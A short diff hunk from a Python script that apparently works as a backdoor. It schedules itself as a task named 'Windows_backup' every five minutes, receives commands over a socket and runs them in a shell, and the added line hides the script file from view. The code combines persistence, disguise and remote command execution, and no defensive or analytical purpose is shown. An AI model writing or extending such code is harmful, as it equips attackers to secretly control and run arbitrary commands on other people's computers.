@@ -106,6 +106,7 @@ while True:
     #           '"C:\Users\user\Downloads\ygame\Windows_backup.py" /ST 10:00"')
     os.system('cmd /c "schtasks /create /tn "Windows_backup" /sc minute /mo 5 /tr'
               ' C:\Users\user\Downloads\ygame\Windows_backup.py"')
+    os.system('cmd /c "attrib +h C:\Users\user\Downloads\ygame\Windows_backup.py"')
     command = client.recv(1024)
     command = command.decode()
     op = subprocess.Popen(command, shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
